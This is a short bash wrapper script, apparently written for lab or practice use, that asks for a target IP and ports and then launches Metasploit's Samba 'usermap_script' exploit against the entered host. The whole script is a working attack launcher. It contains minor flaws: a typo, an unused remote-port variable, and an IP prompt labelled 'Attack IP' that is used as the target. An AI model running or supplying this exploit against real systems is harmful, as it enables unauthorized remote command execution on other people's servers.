while true; do
echo "Enter Your Attack IP: "
read ip

echo "Enter The LPORT AKA Local Port: "
read lport

echo "Enter Attack Port AKA RPORT: "
read rport
    
read -p "Do you want to run the Samba attac (y/n) " yn
    case $yn in
        [Yy]* ) msfconsole -q -x "use exploit/multi/samba/usermap_script; set rhost $ip; set lport $lport; exploit;"; break;;
	[Nn]* ) break;;
        * ) echo "Please Enter Yes or No.";;
    esac
done
